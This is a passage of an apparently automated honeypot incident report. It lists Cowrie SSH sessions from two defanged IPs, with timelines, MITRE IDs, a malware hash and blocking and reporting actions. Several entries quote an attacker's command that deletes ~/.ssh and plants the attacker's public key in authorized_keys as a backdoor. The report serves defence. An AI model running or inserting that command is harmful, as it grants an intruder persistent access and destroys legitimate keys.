| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:09:25` | `cowrie.session.connect` |
| `2026-05-02 07:09:25` | `cowrie.client.version` |
| `2026-05-02 07:09:25` | `cowrie.client.kex` |
| `2026-05-02 07:09:26` | `cowrie.login.success` |
| `2026-05-02 07:09:26` | `cowrie.session.params` |
| `2026-05-02 07:09:26` | `cowrie.command.input` |
| `2026-05-02 07:09:26` | `cowrie.command.failed` |
| `2026-05-02 07:09:26` | `cowrie.log.closed` |
| `2026-05-02 07:09:29` | `cowrie.session.params` |
| `2026-05-02 07:09:29` | `cowrie.command.input` |
| `2026-05-02 07:09:29` | `cowrie.session.file_download` |
| `2026-05-02 07:09:29` | `cowrie.log.closed` |
| `2026-05-02 07:09:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.202[.]217` to AbuseIPDB if not already reported
- [ ] Block `45.78.202[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0ffff1c9816

| Field | Detail |
|---|---|
| **Source IP** | `45.78.202[.]217` |
| **First Seen** | 2026-05-02 07:09 |
| **Last Seen** | 2026-05-02 07:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:09:31` | `cowrie.session.connect` |
| `2026-05-02 07:09:31` | `cowrie.client.version` |
| `2026-05-02 07:09:32` | `cowrie.client.kex` |
| `2026-05-02 07:09:35` | `cowrie.login.success` |
| `2026-05-02 07:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.202[.]217` to AbuseIPDB if not already reported
- [ ] Block `45.78.202[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6d38015751e

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:35 |
| **Last Seen** | 2026-05-02 07:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:35:43` | `cowrie.session.connect` |
| `2026-05-02 07:35:43` | `cowrie.client.version` |
| `2026-05-02 07:35:43` | `cowrie.client.kex` |
| `2026-05-02 07:35:44` | `cowrie.login.success` |
| `2026-05-02 07:35:44` | `cowrie.session.params` |
| `2026-05-02 07:35:44` | `cowrie.command.input` |
| `2026-05-02 07:35:44` | `cowrie.command.failed` |
| `2026-05-02 07:35:44` | `cowrie.log.closed` |
| `2026-05-02 07:35:44` | `cowrie.session.params` |
| `2026-05-02 07:35:44` | `cowrie.command.input` |
| `2026-05-02 07:35:44` | `cowrie.session.file_download` |
| `2026-05-02 07:35:44` | `cowrie.log.closed` |
| `2026-05-02 07:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3a70d1623ab

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:35 |
| **Last Seen** | 2026-05-02 07:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:35:46` | `cowrie.session.connect` |
| `2026-05-02 07:35:46` | `cowrie.client.version` |
| `2026-05-02 07:35:46` | `cowrie.client.kex` |
| `2026-05-02 07:35:46` | `cowrie.login.success` |
| `2026-05-02 07:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c333b07ae3b

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:39 |
| **Last Seen** | 2026-05-02 07:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:39:32` | `cowrie.session.connect` |
| `2026-05-02 07:39:32` | `cowrie.client.version` |
| `2026-05-02 07:39:32` | `cowrie.client.kex` |
| `2026-05-02 07:39:32` | `cowrie.login.success` |
| `2026-05-02 07:39:32` | `cowrie.session.params` |
| `2026-05-02 07:39:32` | `cowrie.command.input` |
| `2026-05-02 07:39:32` | `cowrie.command.failed` |
| `2026-05-02 07:39:32` | `cowrie.log.closed` |
| `2026-05-02 07:39:32` | `cowrie.session.params` |
| `2026-05-02 07:39:32` | `cowrie.command.input` |
| `2026-05-02 07:39:32` | `cowrie.session.file_download` |
| `2026-05-02 07:39:32` | `cowrie.log.closed` |
| `2026-05-02 07:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09ad962ff6f7

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:39 |
| **Last Seen** | 2026-05-02 07:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:39:34` | `cowrie.session.connect` |
| `2026-05-02 07:39:34` | `cowrie.client.version` |
| `2026-05-02 07:39:34` | `cowrie.client.kex` |
| `2026-05-02 07:39:34` | `cowrie.login.success` |
| `2026-05-02 07:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a24078c0b8b

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:43 |
| **Last Seen** | 2026-05-02 07:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:43:32` | `cowrie.session.connect` |
| `2026-05-02 07:43:32` | `cowrie.client.version` |
| `2026-05-02 07:43:32` | `cowrie.client.kex` |
| `2026-05-02 07:43:32` | `cowrie.login.success` |
| `2026-05-02 07:43:32` | `cowrie.session.params` |
| `2026-05-02 07:43:32` | `cowrie.command.input` |
| `2026-05-02 07:43:32` | `cowrie.command.failed` |
| `2026-05-02 07:43:32` | `cowrie.log.closed` |
| `2026-05-02 07:43:32` | `cowrie.session.params` |
| `2026-05-02 07:43:32` | `cowrie.command.input` |
| `2026-05-02 07:43:33` | `cowrie.session.file_download` |
| `2026-05-02 07:43:33` | `cowrie.log.closed` |
| `2026-05-02 07:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d764ad41e1d5

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:43 |
| **Last Seen** | 2026-05-02 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:43:34` | `cowrie.session.connect` |
| `2026-05-02 07:43:34` | `cowrie.client.version` |
| `2026-05-02 07:43:34` | `cowrie.client.kex` |
| `2026-05-02 07:43:34` | `cowrie.login.success` |
| `2026-05-02 07:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc4953185e39

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:44 |
| **Last Seen** | 2026-05-02 07:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:44:28` | `cowrie.session.connect` |
| `2026-05-02 07:44:28` | `cowrie.client.version` |
| `2026-05-02 07:44:28` | `cowrie.client.kex` |
| `2026-05-02 07:44:28` | `cowrie.login.success` |
| `2026-05-02 07:44:28` | `cowrie.session.params` |
| `2026-05-02 07:44:28` | `cowrie.command.input` |
| `2026-05-02 07:44:28` | `cowrie.command.failed` |
| `2026-05-02 07:44:28` | `cowrie.log.closed` |
| `2026-05-02 07:44:28` | `cowrie.session.params` |
| `2026-05-02 07:44:28` | `cowrie.command.input` |
| `2026-05-02 07:44:29` | `cowrie.session.file_download` |
| `2026-05-02 07:44:29` | `cowrie.log.closed` |
| `2026-05-02 07:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3520868ee56

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:44 |
| **Last Seen** | 2026-05-02 07:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:44:30` | `cowrie.session.connect` |
| `2026-05-02 07:44:30` | `cowrie.client.version` |
| `2026-05-02 07:44:30` | `cowrie.client.kex` |
| `2026-05-02 07:44:30` | `cowrie.login.success` |
| `2026-05-02 07:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c5ac0ff5cdb

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:46 |
| **Last Seen** | 2026-05-02 07:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:46:25` | `cowrie.session.connect` |
| `2026-05-02 07:46:25` | `cowrie.client.version` |
| `2026-05-02 07:46:25` | `cowrie.client.kex` |
| `2026-05-02 07:46:25` | `cowrie.login.success` |
| `2026-05-02 07:46:26` | `cowrie.session.params` |
| `2026-05-02 07:46:26` | `cowrie.command.input` |
| `2026-05-02 07:46:26` | `cowrie.command.failed` |
| `2026-05-02 07:46:26` | `cowrie.log.closed` |
| `2026-05-02 07:46:26` | `cowrie.session.params` |
| `2026-05-02 07:46:26` | `cowrie.command.input` |
| `2026-05-02 07:46:26` | `cowrie.session.file_download` |
| `2026-05-02 07:46:26` | `cowrie.log.closed` |
| `2026-05-02 07:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-138b33e55797

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:46 |
| **Last Seen** | 2026-05-02 07:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:46:27` | `cowrie.session.connect` |
| `2026-05-02 07:46:27` | `cowrie.client.version` |
| `2026-05-02 07:46:27` | `cowrie.client.kex` |
| `2026-05-02 07:46:28` | `cowrie.login.success` |
| `2026-05-02 07:46:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f23d0a4ccfa7

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:47 |
| **Last Seen** | 2026-05-02 07:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:47:27` | `cowrie.session.connect` |
| `2026-05-02 07:47:27` | `cowrie.client.version` |
| `2026-05-02 07:47:27` | `cowrie.client.kex` |
| `2026-05-02 07:47:27` | `cowrie.login.success` |
| `2026-05-02 07:47:27` | `cowrie.session.params` |
| `2026-05-02 07:47:27` | `cowrie.command.input` |
| `2026-05-02 07:47:27` | `cowrie.command.failed` |
| `2026-05-02 07:47:27` | `cowrie.log.closed` |
| `2026-05-02 07:47:28` | `cowrie.session.params` |
| `2026-05-02 07:47:28` | `cowrie.command.input` |
| `2026-05-02 07:47:28` | `cowrie.session.file_download` |
| `2026-05-02 07:47:28` | `cowrie.log.closed` |
| `2026-05-02 07:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-890c97a3e41f

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:47 |
| **Last Seen** | 2026-05-02 07:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:47:29` | `cowrie.session.connect` |
| `2026-05-02 07:47:29` | `cowrie.client.version` |
| `2026-05-02 07:47:29` | `cowrie.client.kex` |
| `2026-05-02 07:47:30` | `cowrie.login.success` |
| `2026-05-02 07:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eb1e7a176be

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:48 |
| **Last Seen** | 2026-05-02 07:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:48:28` | `cowrie.session.connect` |
| `2026-05-02 07:48:28` | `cowrie.client.version` |
| `2026-05-02 07:48:28` | `cowrie.client.kex` |
| `2026-05-02 07:48:28` | `cowrie.login.success` |
| `2026-05-02 07:48:28` | `cowrie.session.params` |
| `2026-05-02 07:48:28` | `cowrie.command.input` |
| `2026-05-02 07:48:28` | `cowrie.command.failed` |
| `2026-05-02 07:48:29` | `cowrie.log.closed` |
| `2026-05-02 07:48:29` | `cowrie.session.params` |
| `2026-05-02 07:48:29` | `cowrie.command.input` |
| `2026-05-02 07:48:29` | `cowrie.session.file_download` |
| `2026-05-02 07:48:29` | `cowrie.log.closed` |
| `2026-05-02 07:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bbe9ba040ba

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:48 |
| **Last Seen** | 2026-05-02 07:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:48:30` | `cowrie.session.connect` |
| `2026-05-02 07:48:30` | `cowrie.client.version` |
| `2026-05-02 07:48:30` | `cowrie.client.kex` |
| `2026-05-02 07:48:31` | `cowrie.login.success` |
| `2026-05-02 07:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-199923490529

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:49 |
| **Last Seen** | 2026-05-02 07:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 07:49:28` | `cowrie.session.connect` |
| `2026-05-02 07:49:28` | `cowrie.client.version` |
| `2026-05-02 07:49:28` | `cowrie.client.kex` |
| `2026-05-02 07:49:28` | `cowrie.login.success` |
| `2026-05-02 07:49:28` | `cowrie.session.params` |
| `2026-05-02 07:49:28` | `cowrie.command.input` |
| `2026-05-02 07:49:28` | `cowrie.command.failed` |
| `2026-05-02 07:49:29` | `cowrie.log.closed` |
| `2026-05-02 07:49:29` | `cowrie.session.params` |
| `2026-05-02 07:49:29` | `cowrie.command.input` |
| `2026-05-02 07:49:29` | `cowrie.session.file_download` |
| `2026-05-02 07:49:29` | `cowrie.log.closed` |
| `2026-05-02 07:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75d636f6dd07

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-02 07:49 |
| **Last Seen** | 2026-05-02 07:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
